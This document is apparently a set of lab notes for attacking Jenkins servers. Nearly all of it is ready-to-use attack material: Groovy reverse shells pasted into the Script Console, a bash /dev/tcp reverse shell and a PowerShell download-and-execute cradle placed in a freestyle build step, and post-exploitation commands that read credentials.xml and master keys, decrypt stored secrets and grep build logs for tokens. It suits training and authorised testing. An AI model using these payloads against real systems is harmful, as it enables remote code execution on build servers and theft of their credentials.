# Jenkins Labs

> Cross-reference: [[jenkins-methodology]]

---

## Lab 1: Script Console — Groovy Reverse Shell

### Objective
Gain RCE via Jenkins Script Console at `/script`.

### Steps

- [ ] Browse to `http://TARGET:8080`
- [ ] Try default credentials: `admin:admin` or check if no auth required
- [ ] Navigate to `http://TARGET:8080/script`
- [ ] Start listener on attacker:
```bash
nc -nlvp 4443
```
- [ ] Paste Groovy reverse shell (Linux):
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
- [ ] Paste Groovy reverse shell (Windows):
```groovy
String host="ATTACKER_IP";int port=4443;String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break}catch(Exception e){}};p.destroy();s.close()
```
- [ ] Verify shell: `id` / `whoami`
- [ ] Upgrade TTY:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lab 2: Freestyle Job — Build Step RCE

### Objective
Get RCE when Script Console is restricted but you can create jobs.

### Steps

- [ ] Login to Jenkins
- [ ] New Item → name: `pwn` → Freestyle project → OK
- [ ] Scroll to Build section → Add build step
- [ ] **Linux**: Execute shell →
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4443 0>&1
```
- [ ] **Windows**: Execute Windows batch command →
```batch
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"
```
- [ ] Start listener: `nc -nlvp 4443`
- [ ] Save → Build Now
- [ ] Catch reverse shell

---

## Lab 3: Post-Exploitation — Credential Harvesting

### Steps
- [ ] Find Jenkins home:
```bash
# Linux
ls /var/lib/jenkins/
# Windows
dir C:\Users\<user>\.jenkins\
```
- [ ] Extract encrypted credentials:
```bash
cat /var/lib/jenkins/credentials.xml
```
- [ ] Get decryption keys:
```bash
cat /var/lib/jenkins/secrets/master.key
cat /var/lib/jenkins/secrets/hudson.util.Secret
```
- [ ] Decrypt via Script Console (if still accessible):
```groovy
println(hudson.util.Secret.decrypt("{encrypted_string_here}"))
```
- [ ] Check build logs for leaked secrets:
```bash
find /var/lib/jenkins/jobs/ -name "log" -exec grep -li "password\|secret\|key\|token" {} \;
```

---

## Quick Reference

| Scenario | Path to RCE |
|----------|-------------|
| Script Console open | Groovy reverse shell |
| Script Console locked, can create jobs | Freestyle job → build step |
| No access at all | CVE-2018-1999002 + CVE-2019-1003000 chain |
| Limited user (JOB+BUILD) | Freestyle job still works |
